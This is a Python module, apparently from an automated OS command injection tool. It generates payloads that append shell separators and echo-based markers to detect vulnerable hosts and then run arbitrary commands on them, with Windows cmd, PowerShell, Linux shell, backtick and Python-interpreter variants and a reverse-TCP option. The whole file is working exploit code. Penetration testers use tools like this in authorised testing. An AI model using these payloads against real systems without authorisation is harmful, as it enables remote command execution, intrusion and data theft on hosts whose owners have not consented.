#!/usr/bin/env python
# encoding: UTF-8

 

from src.utils import settings

"""
The classic injection technique on Classic OS Command Injection.
The available "classic" payloads.
"""

"""
Classic decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.SKIP_CALC:
      payload = (separator +
                "echo " + TAG + TAG + TAG + settings.CMD_NUL
                )
    else:
        payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c \"" +
              "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" +
              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + settings.CMD_NUL
              )
  else:
    if not settings.WAF_ENABLED:
      if settings.USE_BACKTICKS:
        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
      else:
        math_calc = "$((" + str(randv1) + "%2B" + str(randv2) + "))"
    else:
      if settings.USE_BACKTICKS:
        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
      else:
        math_calc = "$(expr " + str(randv1) + " %2B " + str(randv2) + ")"

    if settings.SKIP_CALC:
      if settings.USE_BACKTICKS:
        payload = (separator +
                  "echo " + TAG +
                  TAG + "" + TAG + "" + 
                  separator
                   )
      else:
        payload = (separator +
                  "echo " + TAG +
                  "$(echo " + TAG + ")" + TAG + "" + 
                  separator
                   )
    else:
      if settings.USE_BACKTICKS:
        payload = (separator +
                  "echo " + TAG +
                  math_calc +
                  TAG + "" + TAG + ""
                   )
      else:
        payload = (separator +
                  "echo " + TAG +
                  math_calc +
                  "$(echo " + TAG + ")" + TAG + "" + 
                  separator
                   )
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, randv1, randv2):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.SKIP_CALC:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + TAG + "')\""
    else:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" + TAG + "'%2B'" + TAG + "')\""

    payload = (separator +
              "for /f \"tokens=*\" %i in ('cmd /c " +
              python_payload +
              "') do @set /p=%i " + settings.CMD_NUL
              )
  else:
    if settings.SKIP_CALC:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                TAG +
                TAG + "')\"" + 
                separator
                )
    else:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG +
                "'%2Bstr(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))" + "%2B'" +
                TAG + "'%2B'" +
                TAG + "')\"" + 
                separator
                )
  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.REVERSE_TCP:
      payload = (separator + 
                cmd + settings.SINGLE_WHITESPACE
                )
    else:
      payload = (separator +
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd +
                "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL
                )
  else:
    settings.USER_APPLIED_CMD = cmd
    if settings.USE_BACKTICKS:
      cmd_exec = "`" + cmd + "`"
      payload = (separator +
                "echo " + TAG +
                "" + TAG + "" +
                cmd_exec +
                "" + TAG + "" + TAG + "" + 
                separator
                )
    else:
      cmd_exec = "$(" + cmd + ")"
      payload = (separator +
                "echo " + TAG +
                "$(echo " + TAG + ")" +
                cmd_exec +
                "$(echo " + TAG + ")" + TAG + "" + 
                separator
                )

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, TAG, cmd):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if settings.REVERSE_TCP:
      payload = (separator + 
                cmd + settings.SINGLE_WHITESPACE
                )
    else:
      payload = (separator +
                "for /f \"tokens=*\" %i in ('" +
                settings.WIN_PYTHON_INTERPRETER + 
                " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + 
                TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                "') do @set /p=%i " + settings.CMD_NUL
                )

  else:

    if settings.USE_BACKTICKS:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + 
                " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo `" + cmd + ")`" + 
                TAG + "'%2B'" + TAG + "')\"" + 
                separator
                )
    else:
      payload = (separator +
                settings.LINUX_PYTHON_INTERPRETER + 
                " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo $(" + cmd + "))'%2B'" + 
                TAG + "'%2B'" + TAG + "')\"" + 
                separator
                )
  return payload

# eof
